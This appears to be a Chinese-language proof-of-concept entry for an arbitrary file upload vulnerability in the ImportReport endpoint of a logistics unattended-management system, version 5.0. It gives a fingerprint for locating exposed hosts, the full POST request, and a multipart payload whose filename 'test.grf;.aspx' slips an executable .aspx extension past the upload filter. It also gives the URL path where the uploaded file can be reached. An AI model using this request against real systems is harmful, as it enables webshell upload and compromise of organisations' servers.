# 易思智能物流无人值守系统ImportReport任意文件上传漏洞

- **系统**：易思智能物流无人值守系统ImportReport　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body=="易思无人值守智能物流"`
- **请求**：`POST /Sys_ReportFile/ImportReport?encode=b HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 130`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.grf;.aspx"
test
--00content0boundary00--
***

上传文件位置
http://xx.xx.xx.xx/GRF/Custom/b.aspx
```

**其他**
- 易思智能物流无人值守系统ImportReport任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易思智能物流无人值守系统5.0